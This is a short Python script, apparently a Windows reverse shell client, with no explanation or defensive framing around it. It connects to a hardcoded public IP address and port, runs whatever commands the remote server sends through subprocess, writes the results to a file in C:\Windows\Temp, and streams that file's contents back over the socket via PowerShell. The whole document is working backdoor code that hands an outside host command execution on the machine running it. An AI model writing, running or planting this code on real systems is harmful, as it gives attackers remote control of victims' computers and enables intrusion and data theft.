import socket
import subprocess
import threading

def send_output(shell_socket):
    while True:
        try:
            output = subprocess.getoutput('powershell -Command "Get-Content -Path C:\\Windows\\Temp\\shell_output.txt"')
            shell_socket.send(output.encode())
        except Exception as e:
            print(f"Error sending output: {e}")
            break

def start_client():
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect(('222.187.238.119', 12818))  # 服务器的公网IP和端口

    shell_output_thread = threading.Thread(target=send_output, args=(client,))
    shell_output_thread.start()

    while True:
        try:
            command = client.recv(4096).decode()
            if command.lower() == 'exit':
                break
            output = subprocess.getoutput(command)
            with open('C:\\Windows\\Temp\\shell_output.txt', 'w') as f:
                f.write(output)
        except Exception as e:
            print(f"Error receiving command: {e}")
            break
    client.close()

if __name__ == "__main__":
    start_client()